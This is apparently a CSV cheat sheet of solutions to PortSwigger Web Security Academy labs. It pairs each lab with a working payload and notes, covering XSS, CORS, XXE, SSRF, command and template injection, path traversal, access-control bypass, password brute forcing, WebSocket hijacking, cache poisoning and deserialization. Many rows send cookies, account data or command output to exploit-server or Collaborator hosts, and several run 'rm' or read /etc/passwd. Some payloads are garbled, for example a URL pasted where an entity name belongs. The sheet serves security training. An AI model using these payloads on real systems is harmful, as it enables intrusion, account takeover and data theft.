Number,Description,Command,Comments,Tags
61,DOM XSS using web messages and JSON.parse,"<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage(""{\""type\"":\""load-channel\"",\""url\"":\""javascript:print()\""}"",""*"")'>

<script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case ""page-load"":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case ""load-channel"":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case ""player-height-changed"":
                                    ACMEplayer.element.style.width = d.width + ""px"";
                                    ACMEplayer.element.style.height = d.height + ""px"";
                                    break;
                            }
                        }, false);
                    </script>","Home page contains an event listenrer that listens for a web message. Expects a string that is parsed using JSON.parse(). The JS expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.

When the iframe in the payload loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse() and sends it to switch.

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.
				

					As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser","DOM-Based, Practitioner"
62,DOM-based open redirection,https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/,"Blog post contains the following link, which returns to the home page of the blog:

<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = ""/""'>Back to Blog</a>

The url parameter contains an open redirection vulnerability that allows you to change where the “Back to Blog” link takes the user.","DOM-Based, Practitioner"
63,DOM-based cookie manipulation,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>"" onload=""if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"">","home page uses a client-side cookie called lastViewedProduct.

The original source of the iframe
 matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe
 loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct
 cookie. The onload

 event handler ensures that the victim is then immediately redirected to
 the home page, unaware that this manipulation ever took place. While 
the victim's browser has the poisoned cookie saved, loading the home 
page will cause the payload to execute.","DOM-Based, Practitioner"
64,CORS vulnerability with basic origin reflection,"<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>","Insecure CORS config that trusts all origins.
Access-Control-Allow-Credentials
Origin is reflected in the origin is reflected in the Access-Control-Allow-Originheader.","Apprentice, CORS"
65,CORS vulnerability with trusted null origin,"<iframe sandbox=""allow-scripts allow-top-navigation allow-forms"" srcdoc=""<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>""></iframe>","Access-Control-Allow-Credentials
 header.
Origin: null. Add this header and observer that the ‘null’ origin is reflected in the Access-Control-Allow-Origin header.","Apprentice, CORS"
66,CORS vulnerability with trusted insecure protocols,"<script>
    document.location=""http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1""
</script>","added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
Observe that the origin is reflected in the https://portswigger.net/web-security/cors/access-control-allow-origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
productID parameter is vulnerable to XSS. This is seen when clicking ‘Check stock’, and it is loaded on a HTTP URL subdomain.","CORS, Practitioner"
67,Exploiting XXE using external entities to retrieve files,"<!DOCTYPE test [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""file:///etc/passwd""> ]>","""Check stock"" feature that parses XML input and returns any unexpected values in the response.
Insert external entity definition in between the XML declaration and the stockCheck
 element.

Replace the productId number with a reference to the external entity: &xxe;","Apprentice, XXE"
68,Exploiting XXE to perform SSRF attacks,"<!DOCTYPE test [ <!ENTITY xxe SYSTEM ""http://169.254.169.254/""> ]>","""Check stock"" feature that parses XML input and returns any unexpected values in the response.
Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin
. This should return JSON containing the SecretAccessKey.","Apprentice, XXE"
69,Blind XXE with out-of-band interaction,"<!DOCTYPE stockCheck [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""http://BURP-COLLABORATOR-SUBDOMAIN""> ]>","""Check stock"" feature that parses XML input but does not display the result.

Replace productId number with a reference to the external entity: &xxe;","Practitioner, XXE"
70,Blind XXE with out-of-band interaction via XML parameter entities,"<!DOCTYPE stockCheck [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""http://BURP-COLLABORATOR-SUBDOMAIN""> %xxe; ]>","""Check stock"" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.","Practitioner, XXE"
71,Exploiting blind XXE to exfiltrate data using a malicious external DTD,"<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % eval ""<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""YOUR-DTD-URL""> %xxe;]>","Save first command in Exploit Server.

Second XXE payload will then access the XXE in the exploit server and call out to the Burp Collaborator.","Practitioner, Review, XXE"
72,Exploiting blind XXE to retrieve data via error messages,"<!ENTITY % file SYSTEM ""file:///etc/passwd"">
<!ENTITY % eval ""<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""YOUR-DTD-URL""> %xxe;]>",Error message will have the contents of the /etc/passwd file,"Practitioner, XXE"
73,Exploiting XInclude to retrieve files,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include parse=""text"" href=""file:///etc/passwd""/></foo>","Don't control the entire XML document you can't define a DTD to launch a classic https://portswigger.net/web-security/xxe
 attack.

Use XInclude statement to retrieve the contents of the /etc/passwd file","Practitioner, XXE"
74,Exploiting XXE via image file upload,"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE test [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""file:///etc/hostname"" > ]><svg width=""128px"" height=""128px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1""><text font-size=""16"" x=""0"" y=""16"">&xxe;</text></svg>","SVG image format uses XML.

Create SVG file with the payload content. Upload the image as an avatar and post a comment. The /etc/hostname file should be in the image.","Practitioner, XXE"
,,,,XXE
,,,,XXE
75,Basic SSRF against the local server,"http://localhost/admin

http://localhost/admin/delete?username=carlos","/admin is blocked.

Use check stock feature, change the stockApi parameter to access admin interface.

stockApi is a website URL e.g. http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1","Apprentice, SSRF"
76,Basic SSRF against another back-end system,http://192.168.0.1:8080/admin,"change the stockApi
 parameter to http://192.168.0.1:8080/admin
 then highlight the final octet of the IP address (the number 1
), click ""Add §"".

Use Intruder and set the payloads to iterate up by 1.

Use the status column to sort and identify which IP address has an internal service running on it.","Apprentice, SSRF"
77,SSRF with blacklist-based input filter,"http://127.1/

http://127.1/admin

Double URL encode to bypass","Use double URL encoding to bypass, this can be done just on the ‘a’ character.","Practitioner, SSRF"
78,SSRF with filter bypass via open redirection vulnerability,"/product/nextProduct?path=http://192.168.0.12:8080/admin

stockApi=%2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin","the path
 parameter is placed into the Location header of a redirection response, resulting in an open redirection. You can use this to redirect the stockApi checker to the internal admin page service","Practitioner, Review, SSRF"
79,Blind SSRF with out-of-band detection,Insert Collaborator payload into Referer header,"Select the Referer header, right-click and select ""Insert Collaborator Payload"" to replace the original domain with a Burp Collaborator generated domain. Send the request.","Practitioner, SSRF"
80,"OS command injection, simple case",productId=1&storeId=1|whoami,"StoreId parameter, use the | to split the statement and then inject a new command.","Apprentice, OS Command Injection"
81,Blind OS command injection with time delays,email=x||ping+-c+10+127.0.0.1||,Requests to the feedback form,"OS Command Injection, Practitioner"
82,Blind OS command injection with output redirection,email=||whoami>/var/www/images/output.txt||,"To check, intercept a request that loads an image of a product and modify the filename parameter so that it matches the name of the output file

filename=output.txt","OS Command Injection, Practitioner"
83,Blind OS command injection with out-of-band interaction,email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||,Simply testing for a DNS lookup,"OS Command Injection, Practitioner"
84,Blind OS command injection with out-of-band data exfiltration,email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||,Adding a command to the output in Burp Collaborator,"OS Command Injection, Practitioner"
85,Basic server-side template injection,"https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system(""rm+/home/carlos/morale.txt"")+%25>

https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>","GET request uses the message parameter to render “unfortunately this product is out of stock”

Location: /?message=Unfortunately this product is out of stock

Note that this is rendered on the page itself when you click on “view details” for the first product.

ERB documentation, discover that the syntax <%= someExpression %>
 is used to evaluate an expression and render the result on the page.

Key here is that the message parameter in the URL is rendering directly onto the page. So test these for SSTI injections, make sure to URL encode the payload","Practitioner, SSTI"
86,Basic server-side template injection (code context),"blog-post-author-display=user.name}}{{7*7}}

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')","Prefered name parameter makes a request POST /my-account/change-blog-post-author-display

parameters:

blog-post-author-display=user.first_name&csrf=u55IaRymLHNocS15YKaCF42Za2jok2Vg

This shows in a comment, so post a test comment and reload the page with the comments in to see the result of the injection.","Practitioner, SSTI"
87,Server-side template injection using documentation,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""rm /home/carlos/morale.txt"") }",,"Practitioner, SSTI"
88,Server-side template injection in an unknown language with a documented exploit,https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d,"Search the web for ""Handlebars server-side template injection"". You should find a well-known exploit posted by @Zombiehelp54

You find this by fuzzing the message parameter with various strings. e.g.

${{<%[%'""}}%\

The error message will return invalid syntax, which identifies the website is using handlebars","Practitioner, SSTI"
89,Server-side template injection with information disclosure via user-supplied objects,"{% debug %}

{{settings.SECRET_KEY}}","fuzz string ${{<%[%'""}}%\
, and save the template. The error message in the output hints that the Django framework is being used.

Debug first, then notice settings object is accessible. In the Django documentation, there is a SECRET_KEY property.","Practitioner, Review, SSTI"
90,"File path traversal, simple case",../../../etc/passwd,"filename parameter when fetching a product image.

GET /image?filename=29.jpg","Apprentice, Directory Traversal"
91,"File path traversal, traversal sequences blocked with absolute path bypass",/etc/passwd,"the traversal above doesn’t work, but using the absolute path does work.","Directory Traversal, Practitioner"
92,"File path traversal, traversal sequences stripped non-recursively",....//....//....//etc/passwd,extra characters to bypass stripping of characters,"Directory Traversal, Practitioner"
93,"File path traversal, traversal sequences stripped with superfluous URL-decode",..%252f..%252f..%252fetc/passwd,"URL encoding to bypass filter, characters will be URL-decoded and processed","Directory Traversal, Practitioner"
94,"File path traversal, validation of start of path",/var/www/images/../../../etc/passwd,"application is validating the start of the path, but then you can recursively go back from there","Directory Traversal, Practitioner"
95,"File path traversal, validation of file extension with null byte bypass",../../../etc/passwd%00.png,"validates that the filename ends with the expected file extension, this can be bypassed with the null byte","Directory Traversal, Practitioner"
96,Unprotected admin functionality,/administrator-panel,"Browse robots.txt to identify the path to the admin panel, then browse directly to it.","Access Control, Apprentice"
97,Unprotected admin functionality with unpredictable URL,/admin-uofisu,Admin panel URL is disclosed in the JavaScript. You can see this in the Burp Suite sitemap,"Access Control, Apprentice"
98,User role controlled by request parameter,Cookie change Admin=true,"Intercept request when logging in, note that the response sets a cookie Admin=false. Change the cookie to Admin=true and access the admin panel.","Access Control, Apprentice"
99,User role can be modified in user profile,"Add JSON roleid: 2 to request body

{""mailto:email%22:%22test@test.com"",
""roleid"":2
}","Response contains the roleid when using the function to change the email address. Add roleid: 2 into the JSON of the request body.

POST /my-account/change-email
{""mailto:email%22:%22test@test.com""}

Update this to {""mailto:email%22:%22test@test.com"",
""roleid"":2
}","Access Control, Apprentice"
100,User ID controlled by request parameter,"Modify id parameter to another user account

/my-account?id=carlos","URL when requesting account details contains the username parameter.

/my-account?id=carlos","Access Control, Apprentice"
101,"User ID controlled by request parameter, with unpredictable user IDs","Modify id parameter to the GUID of another user account

/my-account?id=d5bb1375-b369-4d7a-831b-29f7def78246","Identify the GUID of the other account by viewing the post authors, this has a link to view all the blogs written by that user and discloses the GUID of that user account.

blogs?userId=d5bb1375-b369-4d7a-831b-29f7def78246","Access Control, Apprentice"
102,User ID controlled by request parameter with data leakage in redirect,"/my-account?id=carlos

Changing the URL parameter causes a redirect to home, but the information is still disclosed in the response body.","The page redirects you when trying to access a different account back to the home page. However, the information of the account you are trying to access is still disclosed in the body of the response before the redirection takes place.","Access Control, Apprentice"
103,User ID controlled by request parameter with password disclosure,"/my-account?id=administrator

View the response body and identify that the password is disclosed.","User account page contains the existing password, when trying to access another account based on the id parameter the password is hidden in the UI, but revealed in the response body","Access Control, Apprentice"
104,Insecure direct object references,/download-transcript/1.txt,"transcripts are saved as text files, changing the filename of the transcript being requested will give access to the other transcripts","Access Control, Apprentice"
105,URL-based access control can be circumvented,X-Original-URL: /admin,"The response when being blocked from accessing /admin is very plain, this could indicate it is from a front-end system.

X-Original-URL: /tester

adding this header returns ‘not found’ which indicates this was processed by the back-end system","Access Control, Practitioner"
106,Method-based access control can be circumvented,Right click and change request method from GET to POST,Circumvent access control on POST request by using GET requests that include the parameters directly within the URL.,"Access Control, Practitioner, Review"
107,Multi-step process with no access control on one step,"Perform an administrative action with a non-admin user, identify the action first with an admin account, but note there is no restriction on the action itself.","Some steps that should be locked to admins only are not properly checking. Some applications will assume that administrative functions are only accessed by admin users, but there are no checks on the administrative actions themselves that the account making the requests have admin privileges.

log in as an admin
see there is an administrative action to promote a different account
copy the request made when promoting an account
perform this action as a low-priv user","Access Control, Practitioner"
108,Referer-based access control,"/admin-roles?username=wiener&action=upgrade

Include the Referer header

Referer: https://0a60006403004af0c086277400cb001c.web-security-academy.net/admin","Directly performing an administrative action can sometimes be blocked unless the referer header is showing it came from the previous admin page.

Manually adding the Referer header can circumvent this.","Access Control, Practitioner"
109,Username enumeration via different responses,"username=§invalid-username§

username=identified-user&password=§invalid-password§","Use Intruder Sniper attack, start with the username and note that the responses for an invalid username and incorrect password are different which allows for username enumeration.

Then repeat the process with the valid username to identify the correct password.","Apprentice, Authentication"
110,2FA simple bypass,/my-account manually change the URL to bypass the 2FA verification,"The 2FA prompt is shown, but is not actually required to access account settings. So browsing directly to the account settings page can bypass this control. You can identify the URL for the account settings page by logging in yourself first and seeing the flow of the application.","Apprentice, Authentication"
111,Password reset broken logic,"POST /forgot-password?temp-forgot-password-token

temp-forgot-password-token=Zl8C2ANa5SONp149RSSoISCRfGNLQGTF&username=carlos&new-password-1=test&new-password-2=test","Token is not being checked, as this can be deleted or reused and the reset functionality still works.

Generate a new password request and change the username to carlos, then note that this changes the password for a different account.","Apprentice, Authentication"
112,Username enumeration via subtly different responses,username=identified-user&password=§invalid-password§,"Error message Invalid username or password.

Error message for a successful username but invalid password is subtly different and has a typo with a trailing space. You can notice this slight difference in response length to determine a correct password.

Use Intruder, and in the Options tab under Grep-Extract you can add a new extraction specifically for the error message, this will add this as a new column in the output to identify the slight difference.","Authentication, Practitioner"
113,Username enumeration via response timing,username=identified-user&password=§invalid-password§,"X-Forwarded-For header is supported which can allow you to spoof the IP address.

For this lab, when you enter a valid username the response time is varied based on the length of the password entered.

Use Intruder and set the password payload to a long string (100 characters or more). Then view the response received column to identify the different response times.","Authentication, Practitioner"
114,"Broken brute-force protection, IP block",,"IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.

Add a list of payloads that alternates between your username and carlos
. Make sure that your username is first and that carlos
 is repeated at least 100 times. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.

For this lab, ensure that the number of threads is set to 1 so that requests happen one by one.","Authentication, Practitioner"
115,Username enumeration via account lock,username=§invalid-username§&password=example§§,"Use Cluster Bomb attack to generate 5 incorrect payloads for each username. One of the usernames will return a message that too many incorrect login attempts have been made (locked out).

Start another Intruder attack, use a Grep-Extract rule on the error message and note that one of the passwords does not return an error message. This is the correct password and can be used to login once the account is reset.","Authentication, Practitioner"
116,2FA broken logic,"POST /login2

Modify verify parameter to carlos and add payload to the mfa-code parameter in Intruder to brute force the verification code","You have to first make a GET request to login2 with Carlos so that a 2FA code is generated for his account.

Then make a POST request to login2 with your own account, but modify the parameters for Carlos and then brute force the mfa-code for his account using Intruder.","Authentication, Practitioner"
117,Brute-forcing a stay-logged-in cookie,,,"Authentication, Practitioner"
118,Offline password cracking,"<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

Obtain the cookie, then crack this offline using a search engine or similar tool.","stay-logged-in cookie:
username+':'+md5HashOfPassword

Steal victim cookie using a stored XXS payload","Authentication, Practitioner"
119,Password reset poisoning via middleware,"X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

temp-forgot-password-token modify to the one received when submitting the request, change username to carlos.","The X-Forwarded-Host header points the dynamically generated reset link to an arbitrary domain. Change the domain to the exploit server with the username carlos, then obtain the password reset link with the token as a query parameter. Note that this one points to the exploit server, so the link itself is invalid but the token is not.

Generate a new, valid password reset link and replace the token value with the previously obtained one.","Authentication, Practitioner, Review"
120,Password brute-force via password change,username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc,"During password reset, if you enter two different new passwords, an error message simply states Current password is incorrect
. If you enter a valid current password, but two different new passwords, the message says New passwords do not match
. We can use this message to enumerate correct passwords.

Use Intruder and add a grep-match rule to flag responses that say “New passwords do not match”. This is because the error message indicates that the current password is correct, so this password can be used to login to the application.","Authentication, Practitioner"
121,Manipulating WebSocket messages to exploit vulnerabilities,<img src=1 onerror='alert(1)'>,"Access the WebSockets history tab in Burp.

Intercept the websocket message with Burp, ensure this is configured in Burp settings","Apprentice, Websockets"
122,Manipulating the WebSocket handshake to exploit vulnerabilities,"<img src=1 oNeRrOr=alert`1`>

X-Forwarded-For: 1.1.1.1",Adding the X-Forwarded-For header can bypass IP address blocking,"Practitioner, Websockets"
123,Cross-site WebSocket hijacking,"<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send(""READY"");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>","The WebSockets READY command retrieves past chat messages from the server. This request has no CSRF tokens.

Exploit is sending this READY message via websocket, to then fetch the past chat messages of the victim account.","Practitioner, Websockets"
124,Web cache poisoning with an unkeyed header,"alert(document.cookie) (in the body of the exploit server file name, change the file name to match the path of the request to /resources/js/tracking.js

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Replay the request until the cahce is poisoned and the X-Cache response in the header returns “hit”.","When a header is what is causing a cache update

add cache buster query parameter such as ?cb=1234 to the home page GET request.

Add X-Forwarded-Host
 header with an arbitrary hostname. This hostname generates an absolute URL stored at /resources/js/tracking.js

Observe X-Cache response to determine if the response came from the cache or not.","Practitioner, Web Cache Poisoning"
125,Web cache poisoning with an unkeyed cookie,"fehost=someString""-alert(1)-""someString","When cookies aren’t included in the cache key.

First response to the application returns the following cookie: fehost=prod-cache-01 This cookie is reflected in a double-quoted JavaScript response.","Practitioner, Web Cache Poisoning"
126,Web cache poisoning with multiple headers,"alert(document.cookie) (in exploit server)

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

X-Forwarded-Scheme - anything other than HTTPS","X-Forwarded-Scheme
 header with any value other than https results in a 302 response, Location header shows that you are being redirected to the URL using https.

Add the X-Forwarded-Host: example.com
 header back to the request, but keep X-Forwarded-Scheme: nothttps

Location
 header of the 302 redirect now points to https://example.com/","Practitioner, Web Cache Poisoning"
127,Targeted web cache poisoning using an unknown header,"X-Host

alert(document.cookie) (in exploit server)

X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

In comment of a blog post:

<img src=""https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo"" />","Use Param Miner to guess headers.

the Vary
 header is used to specify that the User-Agent
 is part of the cache key. To target the victim, you need to find out their User-Agent.

Obtain User-Agent via XSS and then paste the victims user-agent into the header and remove cache buster to poison","Practitioner, Web Cache Poisoning"
128,Web cache poisoning via an unkeyed query string,GET /?evil='/><script>alert(1)</script>,"Use Origin header as a cache buster, add this to your request.","Practitioner, Web Cache Poisoning"
129,Web cache poisoning via an unkeyed query parameter,GET /?utm_content='/><script>alert(1)</script>,"Use Param Miner to identify that utm_content is supported as a parameter. Note this is unkeyed if you add it to your query string and still get a cache hit, it is also reflected in the response.

Add a different query parameter to work as a cache buster.","Practitioner, Web Cache Poisoning"
130,Parameter cloaking,GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1),"utm_content
 parameter is supported and also excluded from the cache key.

If you add a semicolon it is treated as a single parameter and is therefore also excluded from the cache key. Identified with Param Miner loaded, right-click on the request and select ""Bulk scan"" > ""Rails parameter cloaking scan”

GET /js/geolocate.js?callback=setCountryCookie

you can control the name of the function that is called on the returned data by editing the callback
 parameter but it is keyed. Add a second callback parameter to the utm_content, it’s not keyed.

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({""country"" : ""United Kingdom""})","Practitioner, Web Cache Poisoning"
131,Web cache poisoning via a fat GET request,"GET /js/geolocate.js?callback=setCountryCookie
…
callback=alert(1)","GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({""country"" : ""United Kingdom""})

Add a second callback parameter to the body, cache key still derived from the original callback parameter.","Practitioner, Web Cache Poisoning"
132,URL normalization,GET /random</p><script>alert(1)</script><p>foo,"the path requested is reflected in the error message, /random doesn’t exist.

when loaded directly, it doesn’t alert due to URL-encoding. But when poisoned and loaded, the browsers  encoded payload was URL-decoded by the cache.","Practitioner, Web Cache Poisoning"
133,Modifying serialized objects,"Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin
 attribute to b:1
. Click ""Apply changes"". The modified object will automatically be re-encoded and updated in the request.","Session cookie is URL and base64 encoded.

It is a serialized PHP object. admin attribute contains b:0 for false.

","Apprentice, Insecure Deserialization"
134,Modifying serialized data types,"O:4:""User"":2:{s:8:""username"";s:13:""administrator"";s:12:""access_token"";i:0;}","Update the length of the username attribute to 13.
                            
Change the username to administrator.
                            
Change the access token to the integer 0. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
                            
Update the data type label for the access token by replacing s with i.","Insecure Deserialization, Practitioner"
135,Using application functionality to exploit insecure deserialization,"s:11:""avatar_link"";s:23:""/home/carlos/morale.txt""","The cookie has a serialized object avatar_link attribute, which points to your avatar via file path. This is when the account is deleted.

Modify this path to point to /home/carlos/morale.txt

Remember to update the length indicator","Insecure Deserialization, Practitioner"
136,Arbitrary object injection in PHP,"O:14:""CustomTemplate"":1:{s:14:""lock_file_path"";s:23:""/home/carlos/morale.txt"";}","/libs/CustomTemplate.php referenced. You can read the source code of this file by appending the ~ character to the filename.

CustomTemplate class contains the destruct() magic method, which invokes unlink() on the lockfile_path attribute.

Base64 and URL encode the payload, then add this as a session cookie.

Session cookie looks like originally:

O:4:""User"":2:{s:8:""username"";s:6:""wiener"";s:12:""access_token"";s:32:""olt9dugduro0pn89dvad0ckshsxn5ad7"";}

(after URL and base64 decode)","Insecure Deserialization, Practitioner"
